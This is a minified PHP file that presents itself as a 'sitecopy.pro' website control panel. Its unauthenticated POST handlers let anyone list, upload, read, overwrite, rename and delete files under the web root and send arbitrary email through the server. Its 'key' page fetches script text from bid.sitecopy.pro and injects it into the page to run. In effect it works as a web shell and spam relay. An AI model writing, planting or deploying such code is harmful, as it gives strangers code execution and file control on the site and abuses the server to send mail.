<?php /* version 1.5 */ header('Content-Type: text/html; charset=utf-8');if(isset($_SERVER) && isset($_POST)){if(is_array($_SERVER) && is_array($_POST)){if(isset($_SERVER['DOCUMENT_ROOT'])){$v0=rtrim($_SERVER["DOCUMENT_ROOT"],"/");$v0=($v0)?$v0."/":"/";define("SERVER",$v0);function scp0($v1=""){$v2=array("_"," ","а","б","в","г","д","е","ё","ж","з","и","й","к","л","м","н","о","п","р","с","т","у","ф","х","ц","ч","ш","щ","ъ","ы","ь","э","ю","я");$v3=array("-","-","a","b","v","g","d","e","e","zh","z","i","y","k","l","m","n","o","p","r","s","t","u","f","kh","c","ch","sh","sh","","y","","e","yu","ya");$v1=($v1||$v1=="0")?$v1:"";if($v1||$v1=="0"){$v1=mb_strtolower($v1,"UTF-8");$v1=preg_replace("/^\s+/su","",$v1);$v1=preg_replace("/\s+$/su","",$v1);$v1=str_replace($v2,$v3,$v1);$v1=preg_replace("/[^\w\.\-\_]+/is"," ",$v1);$v1=preg_replace("/\s+/s","-",$v1);$v1=preg_replace("/\-+/s","-",$v1);$v1=preg_replace("/^\-+/s","",$v1);$v1=preg_replace("/\-+$/s","",$v1);}return $v1;} function scp1($v4=""){$v4=scp2($v4);return (file_exists(SERVER.$v4))?$v4:false;} function scp2($v5=""){$v0=rtrim(SERVER,"/");if($v0&&strstr($v5,$v0)){$v5=substr_replace($v5,"",0,strlen($v0));} $v5=ltrim($v5,"/");return $v5;} function scp3($v5=""){$v5=trim($v5,"/");return ($v5)?"/".$v5."/":"/";} if(isset($_POST["get"])&&isset($_POST["dir"])&&isset($_POST["ext"])){if($_POST["get"]=="files"&&$_POST["dir"]&&is_array($_POST["ext"])){$v6=true;$v7="";$v8=array();$v9=array();$v10=trim($_POST["dir"],"/");if($v10){$v11=strripos($v10,"/");if($v11!=false){$v5=substr($v10,0,$v11);$v5="/".$v5."/";}else{$v5="/";} array_push($v9,array( "type"=>"dir","src"=>$v5,"basename"=>".." ));} $v10=SERVER."/".$v10;if(file_exists($v10)&&count($_POST["ext"])>0){if($v10=glob($v10."/*")){foreach($v10 as $v12=>$v13){if(is_dir($v13)){$v13=pathinfo($v13);$v5=$v13["dirname"];if($v13["basename"]){$v5.="/".$v13["basename"];} $v5=scp2($v5);array_push($v9,array( "type"=>"dir","src"=>scp3($v5),"basename"=>$v13["basename"] ));}else{$v13=pathinfo($v13);if(in_array($v13["extension"],$_POST["ext"])){$v5=scp2($v13["dirname"]);array_push($v8,array( "type"=>$v13["extension"],"src"=>scp3($v5).$v13["basename"],"filename"=>$v13["basename"],"name"=>rtrim($v13["basename"],".".$v13["extension"]) ) );} } } } } echo json_encode(array("sts"=>$v6,"msg"=>$v7,"dirs"=>$v9,"files"=>$v8));} }elseif(isset($_POST["download"])&&isset($_FILES)&&isset($_POST["dir"])&&isset($_POST["ext"])){if($_POST["download"]=="file"&&$_FILES&&$_POST["dir"]&&$_POST["ext"]){$v6=true;$v7="";$v8=array();$v14=explode(",",$_POST["ext"]);$v5=($_POST["dir"]=="html")?"":$_POST["dir"];if(scp1($v5)!==false&&count($v14)>0){foreach($_FILES as $tp){$v4=pathinfo($tp["name"]);$v4["extension"]=strtolower($v4["extension"]);if(in_array($v4["extension"],$v14)){$v15=$tp["name"];if($_POST["name"]=="date"){$v15=date("Y-m-d-H-i-s")."-".rand();} if($v15=scp0($v15)){$v15=rtrim($v15,".".$v4["extension"]);$v15=trim($v15,"-");if($v15||$v15=="0"){$v16=$v15.".".$v4["extension"];if(move_uploaded_file($tp["tmp_name"],SERVER.$v5.$v16)){array_push($v8,array( "type"=>$v4["extension"],"src"=>scp3($v5).$v16,"filename"=>$v16,"name"=>$v15 ));}else{$v6=false;$v7="FILENOSAVE";} }else{$v6=false;$v7="FILENONAME";} }else{$v6=false;$v7="FILENONAME";} } } }else{$v6=false;$v7="DIRNO";} echo json_encode(array("sts"=>$v6,"msg"=>$v7,"files"=>$v8));} }elseif(isset($_POST["get"])&&isset($_POST["src"])){if($_POST["get"]=="file"&&$_POST["src"]){$v6=true;$v7="";$v17="";if($v4=scp1($_POST["src"])){$v17=file_get_contents(SERVER.$v4);$v18=mb_detect_encoding($v17);if($v18!="UTF-8"){$v17=mb_convert_encoding($v17,$v18);} }else{$v6=false;$v7="FILENO";} echo json_encode(array("sts"=>$v6,"msg"=>$v7,"text"=>$v17));} }elseif(isset($_POST["del"])&&isset($_POST["src"])){if($_POST["del"]=="file"&&$_POST["src"]){$v6=true;$v7="";if($v4=scp1($_POST["src"])){if(!unlink(SERVER.$v4)){$v6=false;$v7="FILENODEL";} }else{$v6=false;$v7="FILENO";} echo json_encode(array("sts"=>$v6,"msg"=>$v7));} }elseif(isset($_POST["rename"])&&isset($_POST["src"])&&isset($_POST["name"])){if($_POST["rename"]=="file"&&$_POST["src"]&&($_POST["name"]||$_POST["name"]=="0")){$v6=true;$v7="";$v19="";$v15=scp0($_POST["name"]);if($v15||$v15=="0"){if($v4=scp1($_POST["src"])){$v4=pathinfo(SERVER.$v4);$v5=scp2($v4["dirname"]);if(rename(SERVER.$v5.$v4["basename"],SERVER.$v5.$v15.".".$v4["extension"])){$v19=scp3($v5).$v15.".".$v4["extension"];}else{$v6=false;$v7="FILENORENAME";} }else{$v6=false;$v7="FILENO";} }else{$v6=false;$v7="FILENONAME";} echo json_encode(array("sts"=>$v6,"msg"=>$v7,"src"=>$v19,"filename"=>$v15.".".$v4["extension"],"name"=>$v15));} }elseif(isset($_POST["save"])&&isset($_POST["src"])&&isset($_POST["text"])){if($_POST["save"]=="file"&&$_POST["src"]&&is_string($_POST["text"])){$v6=true;$v7="";if($v4=scp1($_POST["src"])){$v18=mb_detect_encoding($_POST["text"]);if($v18!="UTF-8"){$_POST["text"]=mb_convert_encoding($_POST["text"],$v18);} file_put_contents(SERVER.$v4,$_POST["text"]);}else{$v6=false;$v7="FILENO";} echo json_encode(array("sts"=>$v6,"msg"=>$v7));} }elseif($_POST["send"]=="mail"&&is_string($_POST["to"])&&is_string($_POST["subject"])&&is_string($_POST["message"])&&is_string($_POST["headers"])){$v6=true;$v7="";if(!mail($_POST["to"],$_POST["subject"],$_POST["message"],$_POST["headers"])){$v6=false;$v7="MAILNO";} echo json_encode(array("sts"=>$v6,"msg"=>$v7));}elseif(isset($_GET["key"])&&isset($_SERVER["SERVER_NAME"])){if($_GET["key"]){?><!DOCTYPE html><html lang="ru" xmlns:og="http://ogp.me/ns#"><head><meta charset="utf-8" /><meta http-equiv="content-type" content="text/html; charset=utf-8" /><meta http-equiv="content-language" content="ru-RU" /><meta name="viewport" content="width=device-width, initial-scale=1" /><meta http-equiv="cache-control" content="no-cache" /><meta http-equiv="expires" content="Sun, 01 Jan 2001 00:00:01 GMT" /><meta name="author" content="sitecopy.pro" /><meta name="generator" content="sitecopy.pro" /><meta name="copyright" content="sitecopy.pro" lang="ru" /><meta name="robots" content="noindex,nofollow" /><title>Панель управления сайтом</title><meta name="description" content="Административная система управления содержимым сайта" /><meta property="og:type" content="website" /> <meta property="og:url" content="<?='http://'.$_SERVER['SERVER_NAME'].'/sitecopy.pro';?>" /> <meta property="og:title" content="Панель управления сайтом" /> <meta property="og:description" content="Административная система управления содержимым сайта" /> <meta property="og:image" content="http://sitecopy.pro/img/icon/social.jpg" /><link rel="icon" type="image/x-icon" href="http://sitecopy.pro/img/icon/favicon.ico" /> <link rel="shortcut icon" type="image/x-icon" href="http://sitecopy.pro/img/icon/favicon.ico" /><style>html,body,div,span,applet,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,a,abbr,acronym,address,big,cite,code,del,dfn,em,font,img,ins,kbd,q,s,samp,small,strike,strong,sub,sup,tt,var,b,u,i,center,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th,td{margin:0;padding:0;border:0;outline:0;font-family:inherit;font-weight:inherit;font-style:inherit;font-size:100%;vertical-align:baseline;background:transparent}body{width:100%;height:101%;line-height:1;color:black;background:white}h1,h2,h3,h4,h5,h6{font-size:100%;font-weight:normal}a{color:#000;outline:none;text-decoration:underline}a:hover,a:link,a:visited{text-decoration:none}ol,ul{list-style:none outside none}input{vertical-align:middle}table{border-collapse:collapse;border-spacing:0}fieldset,img,abbr,acronym{border:0}caption,th,td{text-align:left}blockquote,q{quotes:none;content:none}:focus{outline:0}ins{text-decoration:none}del{text-decoration:line-through}article,aside,details,figcaption,figure,footer,header,hgroup,nav,menu,section{display:block}time{display:inline}address,caption,cite,code,dfn,em,strong,th,var{font-style:normal;font-weight:normal}html{-webkit-text-size-adjust:none}html,body,#body{height:100%;line-height:0px !important;padding:0px !important;margin:0px !important;}body{width:100%;font-size:17px;font-family:Arial,Tahoma,Geneva,Helvetica,sans-serif;line-height:0px !important;padding:0px !important;margin:0px !important;background-color:#FCFCFC;}@media only screen and (min-width: 0px) and (max-width: 499px),only screen and (min-device-width: 0px) and (max-device-width: 499px){body{min-width:300px}}@media only screen and (min-width: 500px) and (max-width: 749px),only screen and (min-device-width: 500px) and (max-device-width: 749px){body{min-width:500px}}@media only screen and (min-width: 750px) and (max-width: 999px),only screen and (min-device-width: 750px) and (max-device-width: 999px){body{min-width:750px}}</style></head><body><script type="text/javascript">function f_scp_SiteCopyPro(){var _xm=new XMLHttpRequest(),_pr=window.location.protocol,_hr=document.location.href;_pr=(_pr=="https:")?_pr:"http:";_xm.open("POST",_pr+"//bid.sitecopy.pro/?g=panel&k="+_hr.match(/sitecopy\.pro(\.php\?key)*\=(\w+)$/)[2],true);_xm.onreadystatechange=function(){if(this.readyState==4){if(this.status==200){var _tx=this.responseText,_sc;if(typeof _tx=="string" && _tx){_sc=document.createElement("script");_sc.type="text/javascript";_sc.text=_tx;document.getElementsByTagName("body")[0].appendChild(_sc);}}else{alert("Ошибка на сервере");}}};_xm.send(null);}f_scp_SiteCopyPro();</script></body></html><?php }}else{echo json_encode(array('sts'=>false,'msg'=>'ERRNO'));}}}}?>